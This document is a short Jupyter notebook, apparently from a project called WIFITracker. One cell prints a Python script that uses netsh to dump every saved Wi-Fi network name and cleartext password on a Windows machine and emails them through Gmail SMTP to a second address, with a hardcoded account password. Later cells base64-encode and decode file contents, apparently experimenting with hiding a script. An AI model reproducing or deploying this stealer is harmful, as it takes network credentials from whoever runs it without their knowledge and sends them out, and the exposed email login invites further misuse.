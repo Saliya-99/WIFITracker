{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "e8bd72a7",
   "metadata": {},
   "outputs": [],
   "source": [
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "0e54dde7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b\"p = subprocess.Popen('netsh wlan show profiles', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\\r\\nl2 = []\\r\\nfor line in p.stdout.readlines():\\r\\n    l1 = line.decode().split(':')\\r\\n    if l1[0].strip() == 'All User Profile':\\r\\n        l2.append(l1[1].strip())\\r\\n\\r\\nl4 = []\\r\\nfor j in l2:\\r\\n    cmd = 'netsh wlan show profile name=' + j + ' key=clear'\\r\\n\\r\\n    p1 = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\\r\\n    for line in p1.stdout.readlines():\\r\\n        l3 = line.decode()\\r\\n        if 'Key Content' in l3:\\r\\n            l4.append((j,l3))\\r\\n\\r\\nretval = p.wait()\\r\\n\\r\\nmessage = '\\\\n'\\r\\nfor j in l4:\\r\\n    message += j[0] + ':'+j[1] + '\\\\n'\\r\\n\\r\\nsender = 'saliyadinusha99@gmail.com'\\r\\nreceivers = 'dinushasaliya@gmail.com'\\r\\n\\r\\nserver = smtplib.SMTP('smtp.gmail.com',587)\\r\\nserver.starttls()\\r\\n\\r\\nserver.login('saliyadinusha99@gmail.com', 'yhgoeelcfvewyguv')\\r\\nserver.sendmail(sender, receivers, message)\"\n"
     ]
    }
   ],
   "source": [
    "f = open(\"main.py\", \"rb\")\n",
    "content = f.read()\n",
    "print(content)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "fb88426b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'cHJpbnQoNCs1KQ=='\n"
     ]
    }
   ],
   "source": [
    "\n",
    "\n",
    "  \n",
    "base64_bytes = base64.b64encode(content)\n",
    "print(base64_bytes)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "75b295b9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'print(4+5)'\n"
     ]
    }
   ],
   "source": [
    "base64_string = base64.b64decode(base64_bytes)\n",
    "print(base64_string)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "b2c56452",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
